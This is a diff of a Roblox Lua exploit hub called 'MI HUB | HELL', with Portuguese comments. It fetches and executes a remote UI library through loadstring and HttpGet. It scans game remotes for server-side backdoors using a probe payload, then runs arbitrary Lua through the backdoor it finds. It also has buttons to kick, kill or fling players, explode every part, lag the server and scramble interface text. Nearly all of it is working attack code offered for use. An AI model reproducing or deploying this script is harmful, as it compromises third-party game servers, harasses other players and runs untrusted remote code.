@@ -1,279 +1,384 @@
--- language: Lua, target: Roblox (Client-Side Independente)
--- MI HUB AURA EDITION - Sem Loadstring, 100% Funcional
+-- language: Lua, target: Roblox
+-- MI HUB AURA EDITION - Scanner, Executor, Utilidades e Destruição
 
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LP = Players.LocalPlayer
 
--- ==========================================
--- CONSTRUÇÃO DA GUI NATIVA (Substitui a Lib)
--- ==========================================
-local parentGui = (gethui and gethui()) or game:GetService("CoreGui")
-if parentGui:FindFirstChild("MI_HUB_HELL") then parentGui.MI_HUB_HELL:Destroy() end
+-- Carrega a Lib AURA (usando o link direto que você mandou)
+local Aura = loadstring(game:HttpGet("https://raw.githubusercontent.com/Sync7771/lib-test/refs/heads/main/AURA%20HUB"))()
 
-local gui = Instance.new("ScreenGui")
-gui.Name = "MI_HUB_HELL"
-gui.ResetOnSpawn = false
-gui.IgnoreGuiInset = true
-gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-gui.DisplayOrder = 9999
-gui.Parent = parentGui
+local win = Aura:CreateWindow({
+    Title = "MI HUB | HELL", 
+    Subtitle = "Scanner & Executor",
+    Theme = "HighContrast", 
+    Size = Vector2.new(650, 520),
+    ToggleKey = Enum.KeyCode.RightControl
+})
+win:SetTitleGradient({From = "#FF0000", To = "#8B0000", Rotation = 45})
+win:SetFloatingButton({Text = "MI", Size = 50, TextColor = Color3.fromRGB(255, 0, 0)})
+win:SetAccent(Color3.fromRGB(255, 0, 0))
 
-local main = Instance.new("Frame")
-main.Size = UDim2.new(0, 600, 0, 450)
-main.Position = UDim2.new(0.5, -300, 0.5, -225)
-main.BackgroundColor3 = Color3.fromRGB(20, 5, 5) -- Vermelho bem escuro (Hell)
-main.BorderSizePixel = 0
-main.Active = true
-main.Parent = gui
-Instance.new("UICorner", main).CornerRadius = UDim.new(0, 10)
-local mstr = Instance.new("UIStroke", main)
-mstr.Color = Color3.fromRGB(255, 0, 0)
-mstr.Thickness = 2
-
-local bar = Instance.new("Frame", main)
-bar.Size = UDim2.new(1, 0, 0, 40)
-bar.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
-bar.BorderSizePixel = 0
-Instance.new("UICorner", bar).CornerRadius = UDim.new(0, 10)
-local bm = Instance.new("Frame", bar)
-bm.Size = UDim2.new(1, 0, 0, 12); bm.Position = UDim2.new(0, 0, 1, -12)
-bm.BackgroundColor3 = Color3.fromRGB(40, 0, 0); bm.BorderSizePixel = 0
-
-local ttl = Instance.new("TextLabel", bar)
-ttl.Size = UDim2.new(1, -50, 1, 0); ttl.Position = UDim2.new(0, 14, 0, 0)
-ttl.BackgroundTransparency = 1; ttl.Text = "MI HUB | HELL"
-ttl.Font = Enum.Font.GothamBold; ttl.TextSize = 16
-ttl.TextColor3 = Color3.fromRGB(255, 50, 50); ttl.TextXAlignment = Enum.TextXAlignment.Left
-
-local xbtn = Instance.new("TextButton", bar)
-xbtn.Size = UDim2.new(0, 24, 0, 24); xbtn.Position = UDim2.new(1, -32, 0.5, -12)
-xbtn.BackgroundColor3 = Color3.fromRGB(60, 0, 0); xbtn.Text = "X"
-xbtn.Font = Enum.Font.GothamBold; xbtn.TextSize = 12
-xbtn.TextColor3 = Color3.fromRGB(255, 255, 255); xbtn.BorderSizePixel = 0; xbtn.AutoButtonColor = false
-Instance.new("UICorner", xbtn).CornerRadius = UDim.new(0, 6)
-xbtn.MouseButton1Click:Connect(function() gui:Destroy() end)
-
--- DRAG
-local dragging, ds, sp
-bar.InputBegan:Connect(function(i)
-    if i.UserInputType == Enum.UserInputType.MouseButton1 then
-        dragging = true; ds = i.Position; sp = main.Position
-        i.Changed:Connect(function() if i.UserInputState == Enum.UserInputState.End then dragging = false end end)
-    end
-end)
-bar.InputChanged:Connect(function(i)
-    if dragging and i.UserInputType == Enum.UserInputType.MouseMovement then
-        local d = i.Position - ds
-        main.Position = UDim2.new(sp.X.Scale, sp.X.Offset + d.X, sp.Y.Scale, sp.Y.Offset + d.Y)
-    end
-end)
-
--- TABS LAYOUT
-local tabBar = Instance.new("Frame", main)
-tabBar.Size = UDim2.new(1, -28, 0, 32); tabBar.Position = UDim2.new(0, 14, 0, 50)
-tabBar.BackgroundTransparency = 1
-local tl = Instance.new("UIListLayout", tabBar); tl.FillDirection = Enum.FillDirection.Horizontal; tl.Padding = UDim.new(0, 6)
-
-local content = Instance.new("Frame", main)
-content.Size = UDim2.new(1, -28, 1, -130); content.Position = UDim2.new(0, 14, 0, 90)
-content.BackgroundColor3 = Color3.fromRGB(30, 10, 10); content.BorderSizePixel = 0
-Instance.new("UICorner", content).CornerRadius = UDim.new(0, 8)
-local cs = Instance.new("UIStroke", content); cs.Color = Color3.fromRGB(80, 20, 20)
-
-local scroll = Instance.new("ScrollingFrame", content)
-scroll.Size = UDim2.new(1, -16, 1, -16); scroll.Position = UDim2.new(0, 8, 0, 8)
-scroll.BackgroundTransparency = 1; scroll.BorderSizePixel = 0
-scroll.ScrollBarThickness = 4; scroll.ScrollBarImageColor3 = Color3.fromRGB(255, 0, 0)
-scroll.CanvasSize = UDim2.new(0, 0, 0, 0); scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
-local gl = Instance.new("UIGridLayout", scroll)
-gl.CellSize = UDim2.new(0.5, -6, 0, 32); gl.CellPadding = UDim2.new(0, 8, 0, 6); gl.SortOrder = Enum.SortOrder.LayoutOrder
-
--- LÓGICA DE SCAN E COMANDOS
 local backdoorRemote = nil
 local selectedTarget = ""
 
-local function sendCmd(code)
-    if not backdoorRemote then return end
+-- ==========================================
+-- ABA 1: SCANNER / EXECUTOR
+-- ==========================================
+local tabExec = win:CreateTab({Name = "Executor", Icon = "terminal"})
+local statusLabel = tabExec:CreateLabel({Name = "Status: Aguardando INJECT..."})
+
+tabExec:CreateButton({
+    Name = "INJECT (Scan Remotes)",
+    Icon = "search",
+    Callback = function()
+        statusLabel:Set("Status: Escaneando remotes...")
+        local remotes = {}
+        local seen = {}
+        local function scan(obj)
+            if not obj or seen[obj] then return end
+            seen[obj] = true
+            if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
+                table.insert(remotes, obj)
+            end
+            for _, c in ipairs(obj:GetChildren()) do pcall(scan, c) end
+        end
+        pcall(scan, ReplicatedStorage)
+        pcall(scan, LP)
+        pcall(scan, workspace)
+        
+        if #remotes == 0 then
+            statusLabel:Set("Status: Nenhum remote encontrado.")
+            win:Notify({Title = "Falha", Content = "Nenhum remote encontrado.", Duration = 5})
+            return
+        end
+
+        local codeMap = {}
+        local function randomName()
+            local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+            local out = {}
+            for i = 1, 16 do
+                local n = math.random(1, #chars)
+                out[i] = chars:sub(n, n)
+            end
+            return table.concat(out)
+        end
+
+        for _, r in ipairs(remotes) do
+            local code = randomName()
+            codeMap[code] = r
+            local payload = "a=Instance.new('Model',workspace)a.Name='" .. code .. "'"
+            pcall(function()
+                if r:IsA("RemoteEvent") then r:FireServer(payload) else r:InvokeServer(payload) end
+            end)
+            task.wait()
+        end
+
+        local found = false
+        for cycle = 1, 100 do
+            for code, remote in pairs(codeMap) do
+                if workspace:FindFirstChild(code) then
+                    found = true
+                    backdoorRemote = remote
+                    pcall(function() workspace[code]:Destroy() end)
+                    statusLabel:Set("Status: Backdoor Encontrada! (" .. remote.Name .. ")")
+                    win:Notify({Title = "Sucesso", Content = "Backdoor viva em: " .. remote:GetFullName(), Duration = 5})
+                    break
+                end
+            end
+            if found then break end
+            task.wait(0.1)
+        end
+
+        if not found then
+            statusLabel:Set("Status: Nenhuma backdoor respondeu.")
+            win:Notify({Title = "Falha", Content = "Nenhuma backdoor viva encontrada.", Duration = 5})
+        end
+    end
+})
+
+local textBox = tabExec:CreateTextArea({
+    Name = "Script Code",
+    PlaceholderText = "-- Cole seu script Lua aqui (Executado localmente ou via backdoor)",
+    Height = 150,
+    MaxLength = 0
+})
+
+tabExec:CreateButton({
+    Name = "EXECUTE",
+    Icon = "play",
+    Callback = function()
+        local src = textBox:Get()
+        if src == "" or src == nil then
+            win:Notify({Title = "Aviso", Content = "A textbox está vazia.", Duration = 3})
+            return
+        end
+        if backdoorRemote then
+            pcall(function()
+                if backdoorRemote:IsA("RemoteEvent") then backdoorRemote:FireServer(src) else backdoorRemote:InvokeServer(src) end
+            end)
+        end
+        local func, err = loadstring(src, "=MI_HUB")
+        if not func then
+            win:Notify({Title = "Erro (Loadstring)", Content = tostring(err), Duration = 5})
+            return
+        end
+        if setfenv then pcall(setfenv, func, getfenv(0)) end
+        local ok, runErr = pcall(func)
+        if ok then
+            win:Notify({Title = "Executado", Content = "Script rodou localmente.", Duration = 3})
+        else
+            win:Notify({Title = "Erro (Runtime)", Content = tostring(runErr), Duration = 5})
+        end
+    end
+})
+
+
+-- ==========================================
+-- ABA 2: UTILIDADES (Para você)
+-- ==========================================
+local tabUtil = win:CreateTab({Name = "Utilidades", Icon = "user"})
+local grpLocal = tabUtil:CreateGroup({Name = "Local Player"})
+
+local speedInput = grpLocal:CreateInput({Name = "Velocidade (Speed)", PlaceholderText = "Ex: 100", Default = "16"})
+grpLocal:CreateButton({Name = "Aplicar Velocidade", Icon = "wind", Callback = function()
+    local h = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
+    if h then h.WalkSpeed = tonumber(speedInput:Get()) or 16 end
+end})
+
+local jumpInput = grpLocal:CreateInput({Name = "Pulo (Jump)", PlaceholderText = "Ex: 100", Default = "50"})
+grpLocal:CreateButton({Name = "Aplicar Pulo", Icon = "arrow-up", Callback = function()
+    local h = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
+    if h then h.JumpPower = tonumber(jumpInput:Get()) or 50 end
+end})
+
+
+-- ==========================================
+-- ABA 3: ADMIN (Usa a backdoor)
+-- ==========================================
+local tabAdmin = win:CreateTab({Name = "Admin", Icon = "shield"})
+local grpPlayer = tabAdmin:CreateGroup({Name = "Alvo", Description = "Escolha o alvo"})
+
+grpPlayer:CreatePlayerList({
+    Name = "Jogadores",
+    Height = 120,
+    Multi = false,
+    Callback = function(player) if player then selectedTarget = player.Name end end
+})
+grpPlayer:CreateButton({Name = "Selecionar Todos (ALL)", Icon = "users", Callback = function() selectedTarget = "ALL" end})
+
+tabAdmin:CreateSpacer(10)
+local grpAcoes = tabAdmin:CreateGroup({Name = "Ações (Via Backdoor)"})
+
+local function sendCmd(cmd, args)
+    if not backdoorRemote then 
+        win:Notify({Title = "Aviso", Content = "Rode o INJECT primeiro!", Duration = 3})
+        return 
+    end
+    local code = ""
+    if cmd == "kick" then
+        code = string.format([[local p = game.Players:FindFirstChild("%s") if p then p:Kick("%s") end]], args.target, args.reason or "Kicked")
+    elseif cmd == "kill" then
+        code = string.format([[local p = game.Players:FindFirstChild("%s") if p and p.Character then p.Character:BreakJoints() end]], args.target)
+    elseif cmd == "explode" then
+        code = [[
+            for _, v in ipairs(workspace:GetDescendants()) do
+                if v:IsA("BasePart") then
+                    local ex = Instance.new("Explosion")
+                    ex.Position = v.Position
+                    ex.Parent = workspace
+                end
+            end
+        ]]
+    elseif cmd == "lag" then
+        code = [[
+            for i = 1, 100 do
+                task.spawn(function()
+                    local p = Instance.new("Part")
+                    p.Size = Vector3.new(100,100,100)
+                    p.Position = Vector3.new(math.random(-1000,1000), math.random(100,500), math.random(-1000,1000))
+                    p.Anchored = false
+                    p.Parent = workspace
+                    task.delay(3, function() if p then p:Destroy() end end)
+                end)
+            end
+        ]]
+    elseif cmd == "fling" then
+        code = string.format([[
+            local p = game.Players:FindFirstChild("%s")
+            if p and p.Character then
+                local hrp = p.Character:FindFirstChild("HumanoidRootPart")
+                if hrp then
+                    local bv = Instance.new("BodyVelocity")
+                    bv.Velocity = Vector3.new(math.random(-1000,1000), 5000, math.random(-1000,1000))
+                    bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+                    bv.Parent = hrp
+                    task.delay(2, function() if bv then bv:Destroy() end end)
+                end
+            end
+        ]], args.target)
+    elseif cmd == "godmode_on" then
+        code = string.format([[
+            local p = game.Players:FindFirstChild("%s")
+            if p and p.Character then
+                local h = p.Character:FindFirstChildOfClass("Humanoid")
+                if h then h.MaxHealth = math.huge; h.Health = math.huge end
+                local r = p.Character:FindFirstChild("HumanoidRootPart")
+                if r then r.Anchored = true end
+            end
+        ]], args.target)
+    elseif cmd == "godmode_off" then
+        code = string.format([[
+            local p = game.Players:FindFirstChild("%s")
+            if p and p.Character then
+                local h = p.Character:FindFirstChildOfClass("Humanoid")
+                if h then h.MaxHealth = 100; h.Health = 100 end
+                local r = p.Character:FindFirstChild("HumanoidRootPart")
+                if r then r.Anchored = false end
+            end
+        ]], args.target)
+    elseif cmd == "invis_on" then
+        code = string.format([[
+            local p = game.Players:FindFirstChild("%s")
+            if p and p.Character then
+                for _, v in ipairs(p.Character:GetDescendants()) do
+                    if v:IsA("BasePart") then v.Transparency = 1 end
+                end
+            end
+        ]], args.target)
+    elseif cmd == "invis_off" then
+        code = string.format([[
+            local p = game.Players:FindFirstChild("%s")
+            if p and p.Character then
+                for _, v in ipairs(p.Character:GetDescendants()) do
+                    if v:IsA("BasePart") then v.Transparency = 0 end
+                end
+            end
+        ]], args.target)
+    end
+    
     pcall(function()
         if backdoorRemote:IsA("RemoteEvent") then backdoorRemote:FireServer(code) else backdoorRemote:InvokeServer(code) end
     end)
+    win:Notify({Title = "Executado", Content = "Comando enviado.", Duration = 2})
 end
 
--- FUNÇÃO PARA CRIAR BOTÃO
-local function createBtn(parent, text, callback, layout)
-    local b = Instance.new("TextButton", parent)
-    b.LayoutOrder = layout or 1
-    b.BackgroundColor3 = Color3.fromRGB(50, 15, 15)
-    b.Text = text; b.Font = Enum.Font.GothamMedium; b.TextSize = 12
-    b.TextColor3 = Color3.fromRGB(255, 200, 200); b.BorderSizePixel = 0; b.AutoButtonColor = false
-    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 6)
-    local s = Instance.new("UIStroke", b); s.Color = Color3.fromRGB(150, 0, 0)
-    b.MouseEnter:Connect(function() b.BackgroundColor3 = Color3.fromRGB(80, 20, 20) end)
-    b.MouseLeave:Connect(function() b.BackgroundColor3 = Color3.fromRGB(50, 15, 15) end)
-    b.MouseButton1Click:Connect(callback)
-    return b
-end
+grpAcoes:CreateButton({Name = "Kick Alvo", Icon = "user-x", Callback = function() 
+    if selectedTarget == "ALL" then for _, p in ipairs(Players:GetPlayers()) do if p ~= LP then p:Kick("Kicked by MI HUB") end end else sendCmd("kick", {target = selectedTarget}) end
+end})
+grpAcoes:CreateButton({Name = "Matar Alvo", Icon = "skull", Callback = function() 
+    if selectedTarget == "ALL" then for _, p in ipairs(Players:GetPlayers()) do if p ~= LP and p.Character then p.Character:BreakJoints() end end else sendCmd("kill", {target = selectedTarget}) end
+end})
+grpAcoes:CreateButton({Name = "Fling Alvo", Icon = "wind", Callback = function()
+    if selectedTarget == "ALL" then for _, p in ipairs(Players:GetPlayers()) do if p ~= LP then sendCmd("fling", {target = p.Name}) end end else sendCmd("fling", {target = selectedTarget}) end
+end})
 
--- CRIAR ABAS
-local tabs = {
-    {name="Executor", color=Color3.fromRGB(255, 50, 50)},
-    {name="Admin", color=Color3.fromRGB(255, 100, 50)},
-    {name="Server", color=Color3.fromRGB(150, 0, 0)}
-}
-local tabButtons = {}
+grpAcoes:CreateToggle({Name = "Godmode (Server-Side)", Icon = "shield", Default = false, Callback = function(state)
+    if selectedTarget == "" then return end
+    local cmd = state and "godmode_on" or "godmode_off"
+    if selectedTarget == "ALL" then for _, p in ipairs(Players:GetPlayers()) do if p ~= LP then sendCmd(cmd, {target = p.Name}) end end else sendCmd(cmd, {target = selectedTarget}) end
+end})
 
-local function renderTab(idx)
-    for _, v in ipairs(scroll:GetChildren()) do
-        if v:IsA("TextButton") or v:IsA("Frame") or v:IsA("TextBox") then v:Destroy() end
-    end
-    
-    if idx == 1 then
-        local btn = createBtn(scroll, "INJECT (Scan Remotes)", function()
-            btn.Text = "SCANNING..."
-            local remotes = {}
-            local seen = {}
-            local function scan(obj)
-                if not obj or seen[obj] then return end
-                seen[obj] = true
-                if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then table.insert(remotes, obj) end
-                for _, c in ipairs(obj:GetChildren()) do pcall(scan, c) end
-            end
-            pcall(scan, ReplicatedStorage)
-            pcall(scan, LP)
-            pcall(scan, workspace)
-            
-            local codeMap = {}
-            for _, r in ipairs(remotes) do
-                local code = tostring(math.random(100000,999999))
-                codeMap[code] = r
-                local payload = "a=Instance.new('Model',workspace)a.Name='" .. code .. "'"
-                pcall(function() if r:IsA("RemoteEvent") then r:FireServer(payload) else r:InvokeServer(payload) end end)
-                task.wait()
-            end
-            
-            local found = false
-            for i = 1, 100 do
-                for code, remote in pairs(codeMap) do
-                    if workspace:FindFirstChild(code) then
-                        found = true
-                        backdoorRemote = remote
-                        workspace[code]:Destroy()
-                        btn.Text = "FOUND!"
-                        btn.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
-                        break
+grpAcoes:CreateToggle({Name = "Invisibilidade (Server-Side)", Icon = "eye-off", Default = false, Callback = function(state)
+    if selectedTarget == "" then return end
+    local cmd = state and "invis_on" or "invis_off"
+    if selectedTarget == "ALL" then for _, p in ipairs(Players:GetPlayers()) do if p ~= LP then sendCmd(cmd, {target = p.Name}) end end else sendCmd(cmd, {target = selectedTarget}) end
+end})
+
+
+-- ==========================================
+-- ABA 4: SERVER (Destruição)
+-- ==========================================
+local tabServer = win:CreateTab({Name = "Server", Icon = "server"})
+local grpServer = tabServer:CreateGroup({Name = "Destruição Server-Side"})
+
+grpServer:CreateButton({Name = "Explodir Tudo", Icon = "bomb", Callback = function() sendCmd("explode") end})
+grpServer:CreateButton({Name = "Lag Server (Pesado)", Icon = "zap", Callback = function() sendCmd("lag") end})
+
+grpServer:CreateToggle({Name = "Rainbow Workspace (Loop Infinito)", Icon = "palette", Default = false, Callback = function(state)
+    if not backdoorRemote then return end
+    if state then
+        local code = [[
+            _G.MI_Rainbow = true
+            task.spawn(function()
+                while _G.MI_Rainbow do
+                    local hue = tick() % 1
+                    local color = Color3.fromHSV(hue, 1, 1)
+                    for _, v in ipairs(workspace:GetDescendants()) do
+                        if v:IsA("BasePart") then pcall(function() v.Color = color end) end
                     end
+                    for _, p in ipairs(game.Players:GetPlayers()) do
+                        local pg = p:FindFirstChild("PlayerGui")
+                        if pg then
+                            for _, gui in ipairs(pg:GetDescendants()) do
+                                if gui:IsA("Frame") or gui:IsA("TextLabel") or gui:IsA("TextButton") then
+                                    pcall(function() gui.BackgroundColor3 = color end)
+                                end
+                            end
+                        end
+                    end
+                    task.wait(0.1)
                 end
-                if found then break end
-                task.wait(0.1)
-            end
-            if not found then btn.Text = "NO BACKDOOR" else task.delay(2, function() btn.Text = "FOUND!" end) end
-        end, 1)
-        
-        -- Textarea
-        local box = Instance.new("Frame", scroll)
-        box.LayoutOrder = 2; box.BackgroundColor3 = Color3.fromRGB(20, 5, 5); box.BorderSizePixel = 0
-        box.Size = UDim2.new(1, 0, 0, 150)
-        Instance.new("UICorner", box).CornerRadius = UDim.new(0, 6)
-        
-        local textbox = Instance.new("TextBox", box)
-        textbox.Size = UDim2.new(1, -10, 1, -10); textbox.Position = UDim2.new(0, 5, 0, 5)
-        textbox.BackgroundTransparency = 1; textbox.Text = ""
-        textbox.PlaceholderText = "-- Cole seu script Lua aqui"
-        textbox.Font = Enum.Font.Code; textbox.TextSize = 12; textbox.TextColor3 = Color3.fromRGB(255,255,255)
-        textbox.TextXAlignment = Enum.TextXAlignment.Left; textbox.TextYAlignment = Enum.TextYAlignment.Top
-        textbox.MultiLine = true
-        
-        createBtn(scroll, "EXECUTE", function()
-            local src = textbox.Text
-            if src == "" then return end
-            if backdoorRemote then pcall(function() backdoorRemote:FireServer(src) end) end
-            local f, e = loadstring(src)
-            if f then pcall(f) else warn(e) end
-        end, 3)
-        
-    elseif idx == 2 then
-        local plist = Instance.new("ScrollingFrame", scroll)
-        plist.LayoutOrder = 1; plist.Size = UDim2.new(1, 0, 0, 100); plist.BackgroundColor3 = Color3.fromRGB(20,5,5); plist.BorderSizePixel = 0
-        Instance.new("UICorner", plist).CornerRadius = UDim.new(0, 6)
-        plist.AutomaticCanvasSize = Enum.AutomaticSize.Y
-        local pl = Instance.new("UIListLayout", plist)
-        
-        for _, p in ipairs(Players:GetPlayers()) do
-            if p ~= LP then
-                local b = Instance.new("TextButton", plist); b.Size = UDim2.new(1,0,0,30); b.Text = p.Name; b.BackgroundTransparency = 1; b.TextColor3 = Color3.fromRGB(255,255,255)
-                b.MouseButton1Click:Connect(function()
-                    selectedTarget = p.Name
-                    win:Notify("Alvo: "..p.Name) -- Opcional
-                end)
-            end
-        end
-        
-        createBtn(scroll, "ALL (Todos)", function() selectedTarget = "ALL" end, 2)
-        createBtn(scroll, "Matar Alvo", function()
-            if selectedTarget == "" then return end
-            sendCmd(string.format([[local p = game.Players:FindFirstChild("%s") if p and p.Character then p.Character:BreakJoints() end]], selectedTarget))
-        end, 3)
-        createBtn(scroll, "Fling Alvo", function()
-            if selectedTarget == "" then return end
-            sendCmd(string.format([[local p = game.Players:FindFirstChild("%s") if p and p.Character then local hrp = p.Character:FindFirstChild("HumanoidRootPart") if hrp then local bv = Instance.new("BodyVelocity") bv.Velocity = Vector3.new(0,5000,0) bv.Parent = hrp end end]], selectedTarget))
-        end, 4)
-        
-    elseif idx == 3 then
-        createBtn(scroll, "Lag Server", function()
-            sendCmd([[
-                for i=1,100 do task.spawn(function() local p = Instance.new("Part") p.Size = Vector3.new(100,100,100) p.Position = Vector3.new(math.random(-1000,1000),math.random(100,500),math.random(-1000,1000)) p.Parent = workspace end) end
-            ]])
-        end, 1)
-        
-        createBtn(scroll, "CRIPTO ALL (Frenesi Visual)", function()
+            end)
+        ]]
+        pcall(function() if backdoorRemote:IsA("RemoteEvent") then backdoorRemote:FireServer(code) else backdoorRemote:InvokeServer(code) end end)
+    else
+        local code = [[ _G.MI_Rainbow = false ]]
+        pcall(function() if backdoorRemote:IsA("RemoteEvent") then backdoorRemote:FireServer(code) else backdoorRemote:InvokeServer(code) end end)
+    end
+end})
+
+-- LÓGICA DO CRIPTO ALL (Modo Frenético Local)
+grpServer:CreateToggle({Name = "CRIPTO ALL (Frenesi Visual)", Icon = "terminal", Default = false, Callback = function(state)
+    if state then
+        _G.MI_CryptoActive = true
+        task.spawn(function()
             local chars = "!@#$%^&*()_+{}|:<>?~1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
             local function scramble(str)
                 if not str or str == "" then return "" end
                 local out = {}
-                for i = 1, #str do local r = math.random(1, #chars); out[i] = chars:sub(r, r) end
+                for i = 1, #str do
+                    local r = math.random(1, #chars)
+                    out[i] = chars:sub(r, r)
+                end
                 if math.random(1, 100) <= 30 then return "HACKED" end
                 return table.concat(out)
             end
 
-            task.spawn(function()
-                local active = true
-                -- Lógica para parar: você pode segurar shift ou clicar novamente
-                while active do
-                    local function corruptObj(obj)
-                        if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
-                            if not obj:GetAttribute("MI_OrigText") then obj:SetAttribute("MI_OrigText", obj.Text) end
-                            local textoOriginal = obj:GetAttribute("MI_OrigText")
-                            if type(textoOriginal) == "string" then pcall(function() obj.Text = scramble(textoOriginal) end) end
+            while _G.MI_CryptoActive do
+                local function corruptObj(obj)
+                    if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
+                        if not obj:GetAttribute("MI_OrigText") then
+                            obj:SetAttribute("MI_OrigText", obj.Text)
+                        end
+                        local textoOriginal = obj:GetAttribute("MI_OrigText")
+                        if type(textoOriginal) == "string" then
+                            pcall(function() obj.Text = scramble(textoOriginal) end)
                         end
                     end
-                    local pg = game.Players.LocalPlayer:FindFirstChild("PlayerGui")
-                    if pg then for _, v in ipairs(pg:GetDescendants()) do corruptObj(v) end end
-                    pcall(function() for _, v in ipairs(game:GetService("CoreGui"):GetDescendants()) do corruptObj(v) end end)
-                    if gethui then pcall(function() for _, v in ipairs(gethui():GetDescendants()) do corruptObj(v) end end) end
-                    task.wait(0.05)
-                    if not gui.Parent then active = false end
                 end
-            end)
-        end, 2)
+                
+                local pg = game.Players.LocalPlayer:FindFirstChild("PlayerGui")
+                if pg then for _, v in ipairs(pg:GetDescendants()) do corruptObj(v) end end
+                
+                pcall(function()
+                    local cg = game:GetService("CoreGui")
+                    for _, v in ipairs(cg:GetDescendants()) do corruptObj(v) end
+                end)
+                
+                if gethui then
+                    pcall(function()
+                        local hui = gethui()
+                        for _, v in ipairs(hui:GetDescendants()) do corruptObj(v) end
+                    end)
+                end
+                
+                task.wait(0.05) 
+            end
+        end)
+        win:Notify({Title = "CRIPTO ALL", Content = "Interface sendo hackeada.", Duration = 3})
+    else
+        _G.MI_CryptoActive = false
+        win:Notify({Title = "CRIPTO ALL", Content = "Parando de criptografar.", Duration = 3})
     end
-end
-
-for i, t in ipairs(tabs) do
-    local tb = Instance.new("TextButton", tabBar)
-    tb.Size = UDim2.new(0.33, -6, 1, 0); tb.LayoutOrder = i
-    tb.BackgroundColor3 = Color3.fromRGB(40, 10, 10); tb.Text = t.name
-    tb.Font = Enum.Font.GothamBold; tb.TextSize = 12; tb.TextColor3 = Color3.fromRGB(255, 255, 255)
-    tb.BorderSizePixel = 0; tb.AutoButtonColor = false
-    Instance.new("UICorner", tb).CornerRadius = UDim.new(0, 6)
-    tb.MouseButton1Click:Connect(function()
-        for _, b in ipairs(tabBar:GetChildren()) do
-            if b:IsA("TextButton") then b.BackgroundColor3 = Color3.fromRGB(40, 10, 10); b.TextColor3 = Color3.fromRGB(255, 255, 255) end
-        end
-        tb.BackgroundColor3 = t.color
-        tb.TextColor3 = Color3.fromRGB(0, 0, 0)
-        renderTab(i)
-    end)
-    table.insert(tabButtons, tb)
-    if i == 1 then tb.BackgroundColor3 = t.color; tb.TextColor3 = Color3.fromRGB(0, 0, 0); renderTab(1) end
-end
+end})
